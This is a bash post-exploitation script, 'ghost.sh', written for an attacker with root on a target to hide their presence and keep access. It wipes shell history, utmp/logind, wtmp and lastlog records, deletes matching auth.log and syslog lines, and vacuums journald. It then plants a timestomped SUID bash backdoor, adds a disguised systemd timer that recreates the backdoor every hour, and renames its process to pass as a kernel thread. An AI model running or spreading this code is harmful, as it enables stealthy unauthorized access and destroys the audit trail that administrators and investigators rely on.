#!/bin/bash
# ghost.sh - session & artifact concealment
# run as root on target
# https://github.com/thankgod4rob/ghost.sh

RED='\033[0;31m'
GRN='\033[0;32m'
YLW='\033[1;33m'
BLU='\033[0;34m'
CYN='\033[0;36m'
NC='\033[0m'
BOLD='\033[1m'

ok()   { echo -e "${GRN}[+]${NC} $1"; }
info() { echo -e "${BLU}[*]${NC} $1"; }
warn() { echo -e "${YLW}[!]${NC} $1"; }
fail() { echo -e "${RED}[-]${NC} $1"; }
head() { echo -e "\n${BOLD}${CYN}=== $1 ===${NC}"; }

# ─────────────────────────────────────────────
# config - edit before running
# ─────────────────────────────────────────────
TARGET_USER="$(whoami)"                                # always the actual running user
MY_PTS=$(tty 2>/dev/null | sed 's|/dev/||')          # e.g. pts/0
MY_IP=$(echo $SSH_CLIENT | awk '{print $1}')           # attacker ip
SUID_PATH="/usr/lib/.dbus-helper"                      # suid binary location (not nosuid mounted)
SUID_NAME="[kworker/2:1H]"                             # process disguise name
# ─────────────────────────────────────────────

echo -e "${BOLD}${RED}"
cat << 'BANNER'
 ▄▄ •  ▄ .▄      .▄▄ · ▄▄▄▄▄   .▄▄ ·  ▄ .▄
▐█ ▀ ▪██▪▐█▪     ▐█ ▀. •██     ▐█ ▀. ██▪▐█
▄█ ▀█▄██▀▐█ ▄█▀▄ ▄▀▀▀█▄ ▐█.▪   ▄▀▀▀█▄██▀▐█
▐█▄▪▐███▌▐▀▐█▌.▐▌▐█▄▪▐█ ▐█▌·   ▐█▄▪▐███▌▐▀
·▀▀▀▀ ▀▀▀ · ▀█▄▀▪ ▀▀▀▀  ▀▀▀  ▀  ▀▀▀▀ ▀▀▀ ·
								ghost.sh
BANNER
echo -e "${NC}"

if [[ $EUID -ne 0 ]]; then
    fail "Must be run as root"
    exit 1
fi

info "Author       : rob"
info "Repo	       : https://github.com/thankgod4rob/ghost.sh"
info "Target user  : $TARGET_USER"
info "Current PTY  : $MY_PTS"
info "SSH client IP: ${MY_IP:-not detected}"
echo ""

# ─────────────────────────────────────────────
head "1. SUPPRESS HISTORY"
# ─────────────────────────────────────────────

# nuke history for current session
unset HISTFILE HISTSIZE HISTFILESIZE
export HISTFILE=/dev/null
export HISTSIZE=0
export HISTFILESIZE=0
history -c 2>/dev/null

# nuke saved history files for target user
for HFILE in \
    /root/.bash_history \
    /root/.zsh_history \
    /home/$TARGET_USER/.bash_history \
    /home/$TARGET_USER/.zsh_history; do
    if [[ -f "$HFILE" ]]; then
        cat /dev/null > "$HFILE"
        chattr +i "$HFILE" 2>/dev/null  # make immutable so bash can't write to it
        ok "Cleared & locked $HFILE"
    fi
done

# patch bashrc to always discard history for this user
BASHRC="/home/$TARGET_USER/.bashrc"
if [[ -f "$BASHRC" ]] && ! grep -q 'HISTFILE=/dev/null' "$BASHRC"; then
    echo -e '\n# system audit suppression\nunset HISTFILE HISTSIZE HISTFILESIZE\nexport HISTFILE=/dev/null' >> "$BASHRC"
    ok "Patched $BASHRC to disable history"
fi

# ─────────────────────────────────────────────
head "2. WIPE UTMP / LOGIND SESSION (who / w)"
# ─────────────────────────────────────────────

# modern debian/pve uses systemd-logind over d-bus - no utmp file
# w reads directly from logind session files in /run/systemd/sessions/

SESSION_DIR="/run/systemd/sessions"
if [[ -d "$SESSION_DIR" ]]; then
    # find all session files belonging to our user with a tty
    MY_SESSIONS=$(grep -rl "^USER=$TARGET_USER$" "$SESSION_DIR" 2>/dev/null | grep -v '\.ref$')
    if [[ -n "$MY_SESSIONS" ]]; then
        for SFILE in $MY_SESSIONS; do
            # only patch sessions with type=tty (these show in w)
            if grep -q "TYPE=tty" "$SFILE" 2>/dev/null; then
                sed -i 's/REMOTE=1/REMOTE=0/'                    "$SFILE"
                sed -i 's/REMOTE_HOST=.*/REMOTE_HOST=/'          "$SFILE"
                sed -i 's/TYPE=tty/TYPE=unspecified/'             "$SFILE"
                sed -i 's/ORIGINAL_TYPE=tty/ORIGINAL_TYPE=unspecified/' "$SFILE"
                sed -i 's/CLASS=user/CLASS=manager-early/'        "$SFILE"
                ok "Patched logind session: $SFILE"
            else
                info "Skipping $SFILE (no TTY, not visible in w)"
            fi
        done
        # signal logind to reload from patched files
        kill -HUP $(pidof systemd-logind) 2>/dev/null \
            && ok "Sent HUP to systemd-logind" \
            || warn "Could not HUP logind"
    else
        warn "No active sessions found for $TARGET_USER in $SESSION_DIR"
    fi
else
    # fallback: classic utmp
    UTMP=""
    for _p in /run/utmp /var/run/utmp; do
        [[ -f "$_p" ]] && UTMP="$_p" && break
    done
    if [[ -n "$UTMP" ]]; then
        python3 - "$UTMP" "$MY_PTS" "$TARGET_USER" "$MY_IP" << 'PYEOF'
import sys
utmp_file   = sys.argv[1]
pts         = sys.argv[2].encode() if sys.argv[2] else b''
target_user = sys.argv[3].encode() if sys.argv[3] else b''
my_ip       = sys.argv[4].encode() if sys.argv[4] else b''
REC_SIZE    = 384
wiped = 0
try:
    with open(utmp_file, 'r+b') as f:
        data = f.read()
        offset = 0
        while offset + REC_SIZE <= len(data):
            chunk = data[offset:offset + REC_SIZE]
            hit = False
            if pts         and pts         in chunk: hit = True
            if target_user and target_user in chunk: hit = True
            if my_ip       and my_ip       in chunk: hit = True
            if hit:
                f.seek(offset)
                f.write(b'\x00' * REC_SIZE)
                wiped += 1
            offset += REC_SIZE
    print(f"[+] Wiped {wiped} utmp record(s)")
except Exception as e:
    print(f"[-] utmp error: {e}")
PYEOF
    else
        warn "No utmp or logind sessions directory found"
    fi
fi

# ─────────────────────────────────────────────
head "3. WIPE WTMP (last)"
# ─────────────────────────────────────────────

WTMP="/var/log/wtmp"
if [[ -f "$WTMP" ]]; then
    python3 - "$WTMP" "$TARGET_USER" "$MY_IP" "$MY_PTS" << 'PYEOF'
import sys, os

wtmp_file   = sys.argv[1]
target_user = sys.argv[2].encode()
my_ip       = sys.argv[3].encode() if sys.argv[3] else b''
my_pts      = sys.argv[4].encode() if sys.argv[4] else b''
REC_SIZE    = 384

with open(wtmp_file, 'r+b') as f:
    data  = f.read()
    offset = 0
    wiped  = 0
    while offset + REC_SIZE <= len(data):
        chunk = data[offset:offset + REC_SIZE]
        hit = False
        if target_user and target_user in chunk: hit = True
        if my_ip       and my_ip       in chunk: hit = True
        if my_pts      and my_pts      in chunk: hit = True
        if hit:
            f.seek(offset)
            f.write(b'\x00' * REC_SIZE)
            wiped += 1
        offset += REC_SIZE

print(f"[+] Wiped {wiped} wtmp record(s)")
PYEOF
    ok "wtmp cleaned"
else
    warn "/var/log/wtmp not found"
fi

# ─────────────────────────────────────────────
head "4. WIPE LASTLOG"
# ─────────────────────────────────────────────

LASTLOG="/var/log/lastlog"
if [[ -f "$LASTLOG" ]]; then
    python3 - "$LASTLOG" "$TARGET_USER" << 'PYEOF'
import sys, pwd

lastlog_file = sys.argv[1]
username     = sys.argv[2]
REC_SIZE     = 292

try:
    uid = pwd.getpwnam(username).pw_uid
    with open(lastlog_file, 'r+b') as f:
        f.seek(uid * REC_SIZE)
        f.write(b'\x00' * REC_SIZE)
    print(f"[+] Cleared lastlog for {username} (uid={uid})")
except KeyError:
    print(f"[-] User {username} not found in passwd")
except Exception as e:
    print(f"[-] lastlog error: {e}")
PYEOF
else
    warn "/var/log/lastlog not found (may use wtmpdb on this system)"
    # handle wtmpdb (systemd-based systems like debian bookworm+)
    if command -v wtmpdb &>/dev/null; then
        warn "wtmpdb detected - entries may persist in /var/log/wtmp.db"
    fi
fi

# ─────────────────────────────────────────────
head "5. SCRUB AUTH.LOG / SYSLOG"
# ─────────────────────────────────────────────

PATTERNS=()
[[ -n "$TARGET_USER" ]] && PATTERNS+=("$TARGET_USER")
[[ -n "$MY_IP"       ]] && PATTERNS+=("$MY_IP")

LOGFILES=(
    /var/log/auth.log
    /var/log/auth.log.1
    /var/log/syslog
    /var/log/secure
    /var/log/messages
    /var/log/ssh/auth.log
)

for LOGF in "${LOGFILES[@]}"; do
    if [[ -f "$LOGF" ]]; then
        for PAT in "${PATTERNS[@]}"; do
            COUNT=$(grep -c "$PAT" "$LOGF" 2>/dev/null | tr -d '[:space:]')
            COUNT=${COUNT:-0}
            if [[ "$COUNT" =~ ^[0-9]+$ ]] && [[ "$COUNT" -gt 0 ]]; then
                sed -i "/${PAT//\//\\/}/d" "$LOGF"
                ok "Removed $COUNT lines matching '$PAT' from $LOGF"
            fi
        done
    fi
done

# also stop rsyslog/journald from logging our actions temporarily
# (don't permanently disable - too obvious)
# flush journald so scraped lines are gone
journalctl --rotate 2>/dev/null
journalctl --vacuum-time=1s 2>/dev/null && ok "Journald vacuumed" || warn "journalctl vacuum failed (non-fatal)"

# ─────────────────────────────────────────────
head "6. DROP SUID BINARY"
# ─────────────────────────────────────────────

cp /bin/bash "$SUID_PATH"
chmod 4755 "$SUID_PATH"
touch -r /bin/bash "$SUID_PATH"        # timestomp to match /bin/bash mtime
chown root:root "$SUID_PATH"
ok "SUID binary planted at $SUID_PATH"
ok "Timestomped to match /bin/bash"
info "Escalate later with: $SUID_PATH -p"

# ─────────────────────────────────────────────
head "7. SYSTEMD TIMER - RECREATE SUID BINARY HOURLY"
# ─────────────────────────────────────────────

cat > /etc/systemd/system/dbus-launch-helper.service << SVCEOF
[Unit]
Description=D-Bus Session Launch Helper
After=dbus.service
Requires=dbus.service

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash ${SUID_PATH}; chmod 4755 ${SUID_PATH}; touch -r /bin/bash ${SUID_PATH}'
StandardOutput=null
StandardError=null
SVCEOF

cat > /etc/systemd/system/dbus-launch-helper.timer << TMREOF
[Unit]
Description=D-Bus Session Helper Timer
Requires=dbus-launch-helper.service

[Timer]
OnBootSec=60sec
OnUnitActiveSec=1h
AccuracySec=5min
Persistent=true

[Install]
WantedBy=timers.target
TMREOF

systemctl daemon-reload 2>/dev/null
systemctl enable dbus-launch-helper.timer --now 2>/dev/null \
    && ok "Systemd timer enabled (hourly SUID recreation)" \
    || warn "Systemd timer setup failed"

# timestomp the service files too
touch -r /etc/systemd/system/dbus.service \
    /etc/systemd/system/dbus-launch-helper.service \
    /etc/systemd/system/dbus-launch-helper.timer 2>/dev/null
ok "Timestomped systemd unit files"

# ─────────────────────────────────────────────
head "8. SSH AUTHORIZED_KEY PERSISTENCE"
# ─────────────────────────────────────────────

warn "Skipping SSH key persistence - provide your public key manually:"
info "  echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys"
info "  chmod 600 /root/.ssh/authorized_keys"

# ─────────────────────────────────────────────
head "9. HIDE CURRENT PROCESS"
# ─────────────────────────────────────────────

# rename current shell in proc (cosmetic but helps)
if [[ -w /proc/$$/comm ]]; then
    echo "$SUID_NAME" > /proc/$$/comm 2>/dev/null \
        && ok "Renamed shell process to '$SUID_NAME' in /proc" \
        || warn "Could not rename process"
fi

# ─────────────────────────────────────────────
head "10. VERIFICATION"
# ─────────────────────────────────────────────

echo ""
info "Running verification checks..."
echo ""

# check we're hidden from w/who
W_CHECK=$(w 2>/dev/null | grep -c "$TARGET_USER" 2>/dev/null | tr -d '[:space:]')
W_CHECK=${W_CHECK:-0}
if [[ "$W_CHECK" =~ ^[0-9]+$ ]] && [[ "$W_CHECK" -eq 0 ]]; then
    ok "Not visible in 'w' output"
else
    warn "Still visible in 'w' output ($W_CHECK entries) - utmp wipe may need manual pts"
fi

# check suid binary
if [[ -u "$SUID_PATH" ]]; then
    ok "suid binary confirmed at $SUID_PATH"
    ls -la "$SUID_PATH"
elif [[ -f "$SUID_PATH" ]]; then
    SUID_PERMS=$(stat -c "%a" "$SUID_PATH" 2>/dev/null)
    warn "binary exists but suid bit not set (perms: $SUID_PERMS) - partition may be nosuid"
    info "try: cp /bin/bash /usr/lib/.dbus-helper && chmod 4755 /usr/lib/.dbus-helper"
else
    fail "suid binary not found at $SUID_PATH"
fi

# check timer
if systemctl is-enabled dbus-launch-helper.timer &>/dev/null; then
    ok "Systemd timer is enabled"
else
    warn "Systemd timer not confirmed"
fi

# check auth.log
if [[ -n "$MY_IP" ]]; then
    AUTH_HITS=$(grep -c "$MY_IP" /var/log/auth.log 2>/dev/null | tr -d '[:space:]')
    AUTH_HITS=${AUTH_HITS:-0}
    if [[ "$AUTH_HITS" =~ ^[0-9]+$ ]] && [[ "$AUTH_HITS" -eq 0 ]]; then
        ok "IP $MY_IP not found in auth.log"
    else
        warn "$AUTH_HITS references to $MY_IP still in auth.log"
    fi
fi

# ─────────────────────────────────────────────
echo ""
echo -e "${BOLD}${GRN}=== GHOST COMPLETE ===${NC}"
echo ""
echo -e "${CYN}Summary:${NC}"
echo -e "  SUID shell    : ${YLW}$SUID_PATH -p${NC}"
echo -e "  Timer         : ${YLW}systemctl status dbus-launch-helper.timer${NC}"
echo -e "  Stay hidden   : ${YLW}ssh -T user@host 'unset HISTFILE; exec bash -i'${NC}"
echo ""
echo -e "${RED}[!] Remember: wtmpdb (/var/log/wtmp.db) on this system may${NC}"
echo -e "${RED}    persist entries sqlite3 can't be wiped by log scrubbing.${NC}"
echo -e "${RED}    Run: sqlite3 /var/log/wtmp.db 'DELETE FROM wtmp WHERE user=\"$TARGET_USER\";'${NC}"
echo ""

# https://github.com/thankgod4rob/ghost.sh
